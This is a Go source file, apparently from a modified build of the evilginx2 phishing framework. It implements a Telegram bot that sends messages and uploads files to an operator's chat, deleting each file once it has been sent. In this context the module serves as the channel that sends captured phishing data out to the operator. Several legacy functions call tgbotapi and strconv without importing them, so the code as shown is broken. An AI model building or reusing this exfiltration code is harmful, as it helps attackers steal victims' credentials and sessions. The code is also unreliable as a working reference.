package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// GlobalTelegramBot is the singleton bot instance used everywhere
var GlobalTelegramBot *TelegramBot

type TelegramBot struct {
	botToken string
	chatID   string
	enabled  bool
	client   *http.Client
	msgQueue chan *TelegramMessage
	wg       sync.WaitGroup
	stopChan chan struct{}
	mu       sync.Mutex
	running  bool
}

type TelegramMessage struct {
	ChatID    string `json:"chat_id"`
	Text      string `json:"text"`
	ParseMode string `json:"parse_mode,omitempty"`
}

func NewTelegramBot() *TelegramBot {
	return &TelegramBot{
		client:   &http.Client{Timeout: 10 * time.Second},
		msgQueue: make(chan *TelegramMessage, 100),
		stopChan: make(chan struct{}),
	}
}

func (t *TelegramBot) SetConfig(botToken, chatID string, enabled bool) {
	t.mu.Lock()
	t.botToken = botToken
	t.chatID = chatID
	t.enabled = enabled
	// Auto start/stop
	shouldStart := enabled && botToken != "" && chatID != ""
	if shouldStart && !t.running {
		t.mu.Unlock()
		t.Start()
		return
	} else if !shouldStart && t.running {
		t.mu.Unlock()
		t.Stop()
		return
	}
	t.mu.Unlock()
}

func (t *TelegramBot) IsEnabled() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.enabled && t.botToken != "" && t.chatID != ""
}

func (t *TelegramBot) Start() {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.running || !t.enabled || t.botToken == "" || t.chatID == "" {
		return
	}
	t.running = true
	t.wg.Add(1)
	go t.messageWorker()
	log.Info("telegram: message worker started")
}

func (t *TelegramBot) Stop() {
	t.mu.Lock()
	if !t.running {
		t.mu.Unlock()
		return
	}
	t.running = false
	close(t.stopChan)
	t.mu.Unlock()
	t.wg.Wait()
	t.mu.Lock()
	t.stopChan = make(chan struct{})
	t.mu.Unlock()
}

func (t *TelegramBot) messageWorker() {
	defer t.wg.Done()
	for {
		select {
		case msg := <-t.msgQueue:
			if msg != nil {
				_ = t.sendMessage(msg)
			}
		case <-t.stopChan:
			// Drain remaining
			for len(t.msgQueue) > 0 {
				if msg := <-t.msgQueue; msg != nil {
					_ = t.sendMessage(msg)
				}
			}
			return
		}
	}
}

func (t *TelegramBot) sendMessage(msg *TelegramMessage) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.botToken)
	jsonData, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// QueueMessage adds a text message to the queue (non-blocking)
func (t *TelegramBot) QueueMessage(text string) {
	if !t.IsEnabled() {
		return
	}
	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      text,
		ParseMode: "MarkdownV2",
	}
	select {
	case t.msgQueue <- msg:
	default:
		log.Warning("telegram: message queue full, dropping message")
	}
}

// SendDocument sends a file (blocks; call with 'go' from caller)
func (t *TelegramBot) SendDocument(filePath string, caption string) error {
	if !t.IsEnabled() {
		return fmt.Errorf("telegram not enabled")
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.botToken)
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return err
	}
	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}
	_ = writer.WriteField("chat_id", t.chatID)
	if caption != "" {
		_ = writer.WriteField("caption", caption)
	}
	_ = writer.Close()

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_ = os.Remove(filePath)
	return nil
}

// SendTestMessage sends a synchronous test message
func (t *TelegramBot) SendTestMessage() error {
	if t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram not configured")
	}
	msg := &TelegramMessage{
		ChatID:    t.chatID,
		Text:      "Telegram Test\n\nIf you receive this, your bot is working correctly!",
		ParseMode: "",
	}
	return t.sendMessage(msg)
}

func escapeMarkdownV2(text string) string {
	replacer := strings.NewReplacer(
		"_", "\\_", "*", "\\*", "[", "\\[", "]", "\\]",
		"(", "\\(", ")", "\\)", "~", "\\~", "`", "\\`",
		">", "\\>", "#", "\\#", "+", "\\+", "-", "\\-",
		"=", "\\=", "|", "\\|", "{", "\\{", "}", "\\}",
		".", "\\.", "!", "\\!",
	)
	return replacer.Replace(text)
}

// ===== OLD FUNCTIONS KEPT FOR BACKWARD COMPATIBILITY =====

func sendTelegramNotification(chatID string, token string, message string, txtFilePath string) (int, error) {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return 0, fmt.Errorf("failed to create Telegram bot: %v", err)
	}
	chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
	if err != nil {
		return 0, fmt.Errorf("invalid chat ID format: %v", err)
	}
	if txtFilePath == "" {
		msg := tgbotapi.NewMessage(chatIDInt, message)
		sent, err := bot.Send(msg)
		if err != nil {
			return 0, fmt.Errorf("error sending message: %v", err)
		}
		return sent.MessageID, nil
	}
	file, err := os.Open(txtFilePath)
	if err != nil {
		return 0, fmt.Errorf("error opening TXT file: %v", err)
	}
	defer file.Close()
	doc := tgbotapi.NewDocument(chatIDInt, tgbotapi.FileReader{
		Name:   txtFilePath,
		Reader: file,
	})
	doc.Caption = message
	msg, err := bot.Send(doc)
	if err != nil {
		return 0, fmt.Errorf("error sending TXT file: %v", err)
	}
	return msg.MessageID, nil
}

func sendMessageWithtxt(botToken string, chatID int64, message string, txtFilePath string) {
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Warning("telegram: %v", err)
		return
	}
	file, err := os.Open(txtFilePath)
	if err != nil {
		return
	}
	defer file.Close()
	doc := tgbotapi.NewDocument(chatID, tgbotapi.FileReader{
		Name:   txtFilePath,
		Reader: file,
	})
	doc.Caption = message
	_, _ = bot.Send(doc)
}

func editMessageFile(chatID string, token string, messageID int, txtFilePath string, msg_body string) error {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageMedia", token)
	file, err := os.Open(txtFilePath)
	if err != nil {
		return fmt.Errorf("error opening TXT file: %v", err)
	}
	defer file.Close()
	var requestBody bytes.Buffer
	writer := multipart.NewWriter(&requestBody)
	_ = writer.WriteField("chat_id", chatID)
	_ = writer.WriteField("message_id", fmt.Sprintf("%d", messageID))
	media := map[string]interface{}{
		"type":    "document",
		"media":   "attach://file",
		"caption": "Note - Message has been updated.\n\n" + msg_body,
	}
	mediaJSON, _ := json.Marshal(media)
	_ = writer.WriteField("media", string(mediaJSON))
	filePart, err := writer.CreateFormFile("file", txtFilePath)
	if err != nil {
		return fmt.Errorf("error creating form file: %v", err)
	}
	_, _ = io.Copy(filePart, file)
	_ = writer.Close()
	req, err := http.NewRequest("POST", url, &requestBody)
	if err != nil {
		return fmt.Errorf("error creating HTTP request: %v", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending HTTP request: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("failed to edit message: %s", string(body))
	}
	return nil
}
